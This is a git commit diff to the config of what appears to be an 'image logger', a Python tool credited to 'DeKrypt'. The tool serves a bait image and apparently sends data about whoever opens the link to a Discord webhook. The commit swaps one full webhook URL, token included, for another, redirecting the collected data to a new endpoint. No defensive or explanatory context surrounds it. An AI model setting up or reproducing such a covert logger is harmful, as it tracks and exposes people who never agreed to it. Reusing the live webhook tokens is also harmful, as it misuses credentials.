a0a1152ed85d4e0aa1191cc53eb2bddd386bae15
Nivgab <122238555+Nivgab@users.noreply.github.com>
2023-07-26 20:30:23 +0300

    Update download.py

--- api/download.py
+++ api/download.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1117928468202659951/pMklwksmwIjZJZn9DjAJce9QYZcI7cptwXQuaaQ_YFe7bCpSW7S_0B7G1X8L8TFEY92X",
+    "webhook": "https://discord.com/api/webhooks/1133811105760804954/m6czk0g_RhpBRNH9CX2lg0x3GKKHa6pGS7TUAg35ttW6pJXTTpA0mvHaAkL_aLDHGNjn",
     "image": "https://media.discordapp.net/attachments/1117924729161007138/1119334702596243608/Screenshot_20230616-203614_CapCut.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
